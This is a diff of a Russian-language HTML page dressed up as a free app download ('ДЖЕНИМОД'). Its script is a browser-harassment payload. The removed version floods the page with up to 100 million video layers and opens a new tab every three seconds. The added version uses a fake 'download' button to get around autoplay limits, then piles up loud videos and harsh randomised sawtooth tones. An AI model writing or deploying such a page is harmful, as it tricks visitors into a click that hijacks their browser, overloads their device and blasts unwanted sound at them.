@@ -1,57 +1,101 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <title>ДЖЕНИМОД СКАЧАТЬ БЕСПЛАТНО БЕЗ СМС И РЕГИСТРАЦИИ</title>
+    <title>ДЖЕНИМОД СКАЧАТЬ БЕСПЛАТНО НА ТЕЛЕФОН БЕЗ СМС И РЕГИСТРАЦИИ</title>
     <style>
-        body { overflow: hidden; margin: 0; }
+        body { overflow: hidden; margin: 0; background: #000; }
         .video-layer {
             position: absolute;
             width: 20vw;
             height: 20vh;
-            opacity: 0.7;
+            opacity: 0.8;
             pointer-events: none;
+            transform: scale(0.8);
+            filter: hue-rotate(90deg);
+        }
+        #audioTrigger {
+            position: fixed;
+            z-index: 1000;
+            top: 10px;
+            left: 10px;
+            padding: 15px;
+            font-size: 18px;
         }
     </style>
 </head>
 <body>
+    <!-- Кнопка для обхода ограничений автовоспроизведения -->
+    <button id="audioTrigger">СКАЧАТЬ</button>
+
     <script>
         // Параметры нагрузки
-        const MAX_LAYERS = 100000000; // Максимум видео-слоёв
-        const SPAWN_DELAY = 50; // Мс между созданиями
-        const VIDEO_SRC = "ambatublow.mp4";
+        const MAX_LAYERS = 300; // Ограничение для предотвращения мгновенного краха
+        const SPAWN_DELAY = 800; // Мс между созданиями
+        const VIDEO_SRC = "ambatublow.mp4"; 
         
-        // Рекурсивное создание видео-слоёв
+        // Глобальные переменные
         let layerCount = 0;
+        let audioEnabled = false;
+        const audioContexts = [];
+
+        // Активатор звука (обход ограничений браузеров)
+        document.getElementById('audioTrigger').addEventListener('click', function() {
+            audioEnabled = true;
+            this.remove();
+            createVideoLayer(); // Запуск процесса
+        });
+
+        // Создание видео-слоя со звуком
         const createVideoLayer = () => {
-            if (layerCount >= MAX_LAYERS) return;
+            if (layerCount >= MAX_LAYERS || !audioEnabled) return;
             
             const layer = document.createElement('div');
             layer.className = 'video-layer';
             layer.style.left = Math.random() * 100 + 'vw';
             layer.style.top = Math.random() * 100 + 'vh';
+            layer.style.transform += ` rotate(${Math.random() * 360}deg)`;
             
             const video = document.createElement('video');
-            video.src = VIDEO_SRC + '?cachebust=' + Date.now();
+            video.src = VIDEO_SRC + '?cachebust=' + Date.now() + layerCount;
             video.autoplay = true;
             video.loop = true;
-            video.muted = false;
             video.playsInline = true;
-            video.style.width = '100%';
-            video.style.height = '100%';
+            video.volume = 1.0; // Максимальная громкость
+            video.muted = false; // Звук ВКЛЮЧЕН
             
+            // Обход ограничений автовоспроизведения звука
+            video.play().catch(e => {
+                // Создаем скрытый аудио-контекст как fallback
+                const ctx = new (window.AudioContext || window.webkitAudioContext)();
+                audioContexts.push(ctx);
+                const oscillator = ctx.createOscillator();
+                oscillator.connect(ctx.destination);
+                oscillator.start();
+            });
+
             layer.appendChild(video);
             document.body.appendChild(layer);
-            
             layerCount++;
-            setTimeout(createVideoLayer, SPAWN_DELAY);
+            
+            // Рекурсивный вызов с рандомизированной задержкой
+            setTimeout(createVideoLayer, SPAWN_DELAY * (0.5 + Math.random()));
         };
 
-        // Запуск процесса
-        createVideoLayer();
-        
-        // Дополнительная нагрузка
+        // Дополнительная звуковая нагрузка
         setInterval(() => {
-            window.open(window.location.href + '?tab=' + Date.now(), '_blank');
+            if (!audioEnabled) return;
+            
+            // Создаем фоновые аудио-потоки
+            try {
+                const ctx = new (window.AudioContext || window.webkitAudioContext)();
+                const oscillator = ctx.createOscillator();
+                oscillator.type = 'sawtooth';
+                oscillator.frequency.setValueAtTime(100 + Math.random() * 2000, ctx.currentTime);
+                oscillator.connect(ctx.destination);
+                oscillator.start();
+                setTimeout(() => oscillator.stop(), 5000);
+            } catch(e) {}
+            
         }, 3000);
     </script>
 </body>
